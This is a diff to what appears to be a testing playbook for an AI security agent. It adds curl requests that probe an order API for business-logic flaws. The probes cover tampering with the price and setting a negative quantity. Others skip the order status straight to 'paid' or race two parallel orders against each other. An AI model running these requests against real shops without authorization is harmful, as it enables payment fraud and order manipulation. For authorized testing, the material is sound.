@@ -56,8 +56,43 @@ leave the logic CVE unconfirmed.
 
 skip | replay | reverse | cross-tenant | stale version | duplicate submit
 
+Baseline flow — complete the legitimate checkout:
+
 ```
-cyber_process argv=["curl","-sS","-D","-","-X","POST","--data-binary","@mut.json","<url>"]
+cyber_process argv=["curl","-sS","-D","-","-H","Authorization: Bearer <token>","-H","Content-Type: application/json","-d","{\"items\":[{\"id\":\"<item>\",\"qty\":1}],\"amount\":1000}","<url>/api/orders"]
+```
+
+Record status, order id, final amount. This is the positive control.
+
+Price mutation — submit with tampered amount:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-H","Authorization: Bearer <token>","-H","Content-Type: application/json","-d","{\"items\":[{\"id\":\"<item>\",\"qty\":1}],\"amount\":1}","<url>/api/orders"]
+```
+
+Quantity mutation:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-H","Authorization: Bearer <token>","-H","Content-Type: application/json","-d","{\"items\":[{\"id\":\"<item>\",\"qty\":-1}],\"amount\":1000}","<url>/api/orders"]
+```
+
+Status/state skip:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-X","PATCH","-H","Authorization: Bearer <token>","-H","Content-Type: application/json","-d","{\"status\":\"paid\"}","<url>/api/orders/<order-id>"]
+```
+
+Persistence read — verify mutation took effect:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-H","Authorization: Bearer <token>","<url>/api/orders/<order-id>"]
+```
+
+Race variant — two parallel requests:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-H","Authorization: Bearer <token>","-H","Content-Type: application/json","-d","{\"items\":[{\"id\":\"<item>\",\"qty\":1}],\"amount\":1,\"ref\":\"RACE-A\"}","<url>/api/orders"]
+cyber_process argv=["curl","-sS","-D","-","-H","Authorization: Bearer <token>","-H","Content-Type: application/json","-d","{\"items\":[{\"id\":\"<item>\",\"qty\":1}],\"amount\":1,\"ref\":\"RACE-B\"}","<url>/api/orders"]
 ```
 
 Persist via GET/ledger/receipt. Race: two requests ~50ms + one final read — not a load test. Money capped at 1 XOF / 0.01. Unique reference each try. Server ignore/recompute is the negative control.
